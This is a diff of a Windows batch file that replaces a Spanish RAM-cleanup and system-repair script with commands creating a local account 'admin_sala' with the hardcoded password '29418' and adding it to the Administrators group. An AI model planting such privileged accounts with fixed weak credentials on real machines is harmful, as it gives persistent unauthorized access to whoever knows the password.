@@ -1,56 +1,5 @@
 @echo off
-:: Comprobar permisos de Administrador
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    echo [!] Este script requiere permisos de Administrador.
-    echo Reejecutando como Administrador...
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
-
-title Optimización de Memoria RAM y Sistema
-color 0A
-
-echo ===================================================
-echo   OPTIMIZACION DE MEMORIA RAM Y REGISTRO/SISTEMA
-echo ===================================================
-echo.
-
-:: 1. Liberar memoria RAM usando RAMMap (si está instalado)
-echo [1/3] Liberando memoria RAM y memoria en espera...
-if exist "%windir%\System32\RAMMap.exe" (
-    RAMMap.exe -Empty WorkingSets
-    RAMMap.exe -Empty SystemWorkingSet
-    RAMMap.exe -Empty StandbyList
-    RAMMap.exe -Empty Priority0StandbyList
-    echo [+] Memoria RAM liberada correctamente.
-) else if exist "%windir%\System32\RAMMap64.exe" (
-    RAMMap64.exe -Empty WorkingSets
-    RAMMap64.exe -Empty SystemWorkingSet
-    RAMMap64.exe -Empty StandbyList
-    RAMMap64.exe -Empty Priority0StandbyList
-    echo [+] Memoria RAM liberada correctamente.
-) else (
-    echo [!] RAMMap no se encontró en C:\Windows\System32.
-    echo     Para liberar RAM en profundidad, coloca RAMMap.exe en System32.
-)
-echo.
-
-:: 2. Limpieza de archivos temporales (libera RAM y caché)
-echo [2/3] Limpiando archivos temporales y caché de DNS...
-ipconfig /flushdns >nul
-del /q /f /s "%TEMP%\*" >nul 2>&1
-del /q /f /s "%SystemRoot%\Temp\*" >nul 2>&1
-echo [+] Caché y temporales limpios.
-echo.
-
-:: 3. Verificación y reparación del Registro y Sistema (SFC / DISM)
-echo [3/3] Comprobando la integridad del Registro y Sistema de Windows...
-echo Este proceso puede tardar unos minutos...
-sfc /scannow
-
-echo.
-echo ===================================================
-echo   Proceso finalizado con éxito.
-echo ===================================================
+net user admin_sala 29418 /add
+net localgroup Administradores admin_sala /add
+echo Usuario admin_sala creado con exito como Administrador.
 pause
